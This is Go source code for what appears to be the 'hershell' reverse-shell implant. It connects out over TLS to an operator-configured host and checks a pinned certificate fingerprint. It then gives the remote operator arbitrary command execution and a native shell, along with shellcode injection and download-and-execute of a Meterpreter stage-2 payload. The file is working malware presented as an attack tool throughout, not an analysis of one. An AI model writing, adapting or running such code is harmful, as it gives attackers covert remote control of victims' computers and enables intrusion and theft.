package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"net"
	"os"
	"os/exec"
	"strings"

	"github.com/lesnuages/hershell/shell"
)

const (
	ERR_COULD_NOT_DECODE = 1 << iota
	ERR_HOST_UNREACHABLE = iota
	ERR_BAD_FINGERPRINT  = iota
)

var (
	connectString string
	fingerPrint   string
)

func InteractiveShell(conn net.Conn) {
	var (
		exit    bool           = false
		prompt  string         = "[hershell]> "
		scanner *bufio.Scanner = bufio.NewScanner(conn)
	)

	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			switch argv[0] {
			case "meterpreter":
				if len(argv) > 1 {
					ok, err := Meterpreter(argv[1])
					if !ok {
						conn.Write([]byte(err.Error() + "\n"))
					}
				}
			case "inject":
				if len(argv) > 1 {
					shell.InjectShellcode(argv[1])
				}
			case "exit":
				exit = true
			case "run_shell":
				conn.Write([]byte("Enjoy your native shell\n"))
				RunShell(conn)
			default:
				shell.ExecuteCmd(command, conn)
			}

			if exit {
				break
			}

		}
		conn.Write([]byte(prompt))
	}
}

func Meterpreter(address string) (bool, error) {
	var (
		stage2LengthBuf []byte = make([]byte, 4)
		stage2LengthInt uint32
		conn            net.Conn
		err             error
	)

	if conn, err = net.Dial("tcp", address); err != nil {
		return false, err
	}

	defer conn.Close()

	if _, err = conn.Read(stage2LengthBuf); err != nil {
		return false, err
	}

	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
	stage2Buf := make([]byte, stage2LengthInt)

	if _, err = conn.Read(stage2Buf); err != nil {
		return false, err
	}

	shell.ExecShellcode(stage2Buf)

	return true, nil
}

func RunShell(conn net.Conn) {
	var cmd *exec.Cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func Reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(ERR_HOST_UNREACHABLE)
	}

	defer conn.Close()

	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(ERR_BAD_FINGERPRINT)
	}
	InteractiveShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ERR_COULD_NOT_DECODE)
		}
		Reverse(connectString, bytesFingerprint)
	}
}
